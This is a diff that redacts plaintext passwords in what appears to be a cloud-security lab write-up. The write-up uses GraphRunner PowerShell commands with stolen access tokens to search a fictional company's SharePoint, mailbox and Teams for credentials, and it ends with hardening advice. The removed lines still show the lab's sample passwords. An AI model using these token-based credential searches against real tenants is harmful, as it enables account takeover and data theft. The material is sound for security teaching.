@@ -263,7 +263,7 @@ Location: https://megabigtech.sharepoint.com/Shared Documents/passwords.xlsx
 Created Date: 2024-03-27T00:13:10Z
 Last Modified Date: 2025-04-24T14:49:38Z
 Size: 14.78 KB
-File Preview: <ddd/><c0>Password</c0> Azure lindsey_adm $R4ncher2043 Dev Env r&d $MEGAPRODUCTS-777$ 1Password Lindsey.<ddd/>
+File Preview: <ddd/><c0>Password</c0> Azure lindsey_adm [REDACTED] Dev Env r&d [REDACTED] 1Password Lindsey.<ddd/>
 DriveID & Item ID: b!bT4vhymq0UWW7LvQnMzGLIicHuknVeZGkE3-8tuCtaeO-nKW9TKYT7NHHw0ABSux\:017K7QPLPAKVIRHIULQ5BK6A3KQTCK2SCD
 ================================================================================
 Result [1]
@@ -272,7 +272,7 @@ Location: https://iancloudpwned.sharepoint.com/sites/FinanceTeam/Shared Document
 Created Date: 2023-11-06T00:17:46Z
 Last Modified Date: 2023-11-06T00:17:00Z
 Size: 20.74 KB
-File Preview: <ddd/><c0>PASSWORDS</c0>) Service/Account: Finance Database URL: https://10.10.11.15/login Username: <ddd/> <c0>Password</c0>: F1n@nc3Db2023! Service/Account: Accounting Software URL: https://accounting.<ddd/>
+File Preview: <ddd/><c0>PASSWORDS</c0>) Service/Account: Finance Database URL: https://10.10.11.15/login Username: <ddd/> <c0>Password</c0>: [REDACTED] Service/Account: Accounting Software URL: https://accounting.<ddd/>
 DriveID & Item ID: b!XM0yHkS8s0KPA7drboV7c7bd4PO1jD1BpS2fN8axCu6HW_Ya2jEcSZSebeuGuDsI\:01UALFMSZAKNKICFDDHRH2II4AID3NQRGJ
 ================================================================================
 [*] Do you want to download any of these files? (Yes/No/All)
@@ -296,7 +296,7 @@ Let's continue our conquest for more credentials with Teams and Outlook.
 PS C:\Users\jonat\Desktop\cloud\GraphRunner> Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
 [*] Using the provided access tokens.
 [*] Found 5 matches for search term password
-Subject: Subscribers database | Sender: /O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP (FYDIBOHF23SPDLT)/CN=RECIPIENTS/CN=EF775FA670FB409789970E587F6F4F04-36FA333D-17 | Receivers: Sam Olsson | Date: 2023-11-06T17:24:50Z | Message Preview: ...login below: Username: financereports Password: $reporting$123 Server: mbt-finance.database.windows.net Database: Finance Clara ...
+Subject: Subscribers database | Sender: /O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP (FYDIBOHF23SPDLT)/CN=RECIPIENTS/CN=EF775FA670FB409789970E587F6F4F04-36FA333D-17 | Receivers: Sam Olsson | Date: 2023-11-06T17:24:50Z | Message Preview: ...login below: Username: financereports Password: [REDACTED] Server: mbt-finance.database.windows.net Database: Finance Clara ...
 ================================================================================
 ```
 
@@ -306,9 +306,9 @@ Searching the user's mailbox provides us with credentials to an Azure SQL server
 PS C:\Users\jonat\Desktop\cloud\GraphRunner> Invoke-SearchTeams -Tokens $tokens -SearchTerm "password" -ResultSize 100
 [*] Using the provided access tokens.
 [*] Refreshing token for Teams use...
-From: Clara.Miller@megabigtech.com | Summary: password: openme123!
+From: Clara.Miller@megabigtech.com | Summary: password: [REDACTED]
 Full Message Body: <html><head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>password: openme123!</p></body></html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>password: [REDACTED]</p></body></html>
 ================================================================================
 From: Clara.Miller@megabigtech.com | Summary: Call IT to reset my password for accounting system
 Full Message Body: <html><head>
@@ -318,9 +318,9 @@ From: Clara.Miller@megabigtech.com | Summary: Call IT to reset my password for a
 Full Message Body: <html><head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>Call IT to reset my password for accounting system</p></body></html>
 ================================================================================
-From: Clara.Miller@megabigtech.com | Summary: password: openme123!
+From: Clara.Miller@megabigtech.com | Summary: password: [REDACTED]
 Full Message Body: <html><head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>password: openme123!</p></body></html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>password: [REDACTED]</p></body></html>
 ================================================================================
 ```
 
@@ -349,7 +349,7 @@ The `passwords.xlsx` and `Finance Logins.docx` files had plaintext credentials s
 
 **SQL Database Hardening**
 
-The credentials `financereports:$reporting$123` shouldn't exist at all. Use managed identities for anything that needs to talk to the database. The SQL server `mbt-finance.database.windows.net` was sitting on the public internet with SQL auth enabled. Lock it down with firewall rules so it only accepts connections from your virtual network, or use private endpoints to keep it off the internet entirely. 
+The credentials `financereports:[REDACTED]` shouldn't exist at all. Use managed identities for anything that needs to talk to the database. The SQL server `mbt-finance.database.windows.net` was sitting on the public internet with SQL auth enabled. Lock it down with firewall rules so it only accepts connections from your virtual network, or use private endpoints to keep it off the internet entirely. 
 
 **Monitor Bulk Graph API Operations**
 
